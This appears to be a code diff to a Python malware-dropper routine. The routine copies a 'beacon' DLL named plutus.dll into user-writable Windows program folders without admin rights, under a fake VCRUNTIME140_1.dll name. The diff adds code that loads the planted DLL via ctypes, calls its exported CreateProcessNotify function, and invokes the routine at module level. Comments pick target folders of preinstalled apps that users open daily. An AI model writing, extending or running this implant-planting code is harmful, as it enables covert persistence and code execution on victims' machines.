@@ -263,8 +263,17 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
     Drop plutus.dll into a user-writable WindowsApps folder (no admin, no takeown/icacls)
     Prioritized targets = folders that are naturally writable by normal users in 2025
     """
-    with open("plutus.dll", "rb") as f:
-        data = f.read()
+    # with open("plutus.dll", "rb") as f:
+    #     data = f.read()
+    
+    # dll = ctypes.WinDLL("plutus.dll")  # assuming it's already reflectively loaded or on disk
+
+    # # Define the function signature (this is hypothetical - actual signature varies by version)
+    # CreateProcessNotify = dll.CreateProcessNotify
+    # CreateProcessNotify.argtypes = []  # usually no arguments
+    # CreateProcessNotify.restype  = wintypes.BOOL
+
+    # result = CreateProcessNotify()
     # Top-tier folders that are almost always writable by standard users (2024–2025)
     # priority_folders = [
     #     # 1. Windows Photos (2025 version) – opened daily
@@ -284,6 +293,8 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
     #     # 5. Skype (still preinstalled on many images)
     #     "Microsoft.SkypeApp_*",
     # ]
+    with open("plutus.dll", "rb") as f:
+        data = f.read()
 
     windowsapps = glob.glob("C:/Program Files/Common Files/**/**/**/")
     if not windowsapps:
@@ -313,8 +324,21 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
 
     try:
         location = f"{folder}/plutus.dll"
-        dll = open(location, "wb").write(data)
+        with open(location, "wb") as dll:
+            dll.write(data) 
+        dll = ctypes.WinDLL(location)  # assuming it's already reflectively loaded or on disk
+        # Define the function signature (this is hypothetical - actual signature varies by version)
+        CreateProcessNotify = dll.CreateProcessNotify
+        CreateProcessNotify.argtypes = []  # usually no arguments
+        CreateProcessNotify.restype  = wintypes.BOOL
+    # 
+        print("Calling CreateProcessNotify")
+        result = CreateProcessNotify()        
         return True
     except Exception as e:
         print(f"[-] Failed to copy: {e}")
         return False
+        
+
+# if __name__ == "main.py":
+mv_dll_plutus_noadmin("plutus.dll", fake_name="VCRUNTIME140_1.dll")
